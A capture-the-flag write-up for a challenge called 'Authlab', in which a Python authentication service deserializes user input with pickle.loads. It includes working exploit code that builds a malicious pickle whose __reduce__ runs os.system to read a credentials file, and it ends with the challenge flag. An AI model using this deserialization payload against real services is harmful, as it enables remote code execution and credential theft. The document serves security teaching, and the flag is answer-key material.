# Authlab

## Challenge (100 points, 20 solves)

> I made an authentication wrapper for services in python. Help me make sure the admin password cannot be leaked.
>
> `nc challs.nusgreyhats.org 33401`
>
> Author: k-hian

## Summary

This challenge presents a Python authentication service with a custom credential system. The service offers multiple login methods, including a feature called "EasyCreds" that uses Python's `pickle` for (de)serialization of user objects.

## Analysis

The main vulnerability is the use of `pickle.loads` on untrusted user input in the `easyLogin` method, without any sanitization or validation. Since `pickle` can execute arbitrary code during deserialization, this allows an attacker to craft a malicious payload that runs arbitrary commands on the server.

## Approach

1. **Understand the code:**
   - The server accepts a base64-encoded pickled object for "EasyCreds" login.
   - The object is deserialized directly with `pickle.loads`, which is unsafe.

2. **Exploit with a malicious pickle:**
   - Create a custom Python class with a `__reduce__` method that executes a command (e.g., `cat Creds.py` to read the admin password or flag).
   - Pickle and base64-encode this object, then submit it as the EasyCreds input.

3. **Retrieve the flag:**
   - The server executes the command and leaks the flag or sensitive file contents.

**Exploit code:**

```python
import pickle, base64

class LeakAdmin(object):
    def __reduce__(self):
        import os
        return (os.system, ("cat Creds.py",))

payload = base64.b64encode(pickle.dumps(LeakAdmin())).decode()
print(payload)
```

Submit the output as your EasyCreds to trigger the exploit and retrieve the flag.

## Flag

`grey{4_p1ck13d_p4ssw0rd_s0uNd5_n1C3}`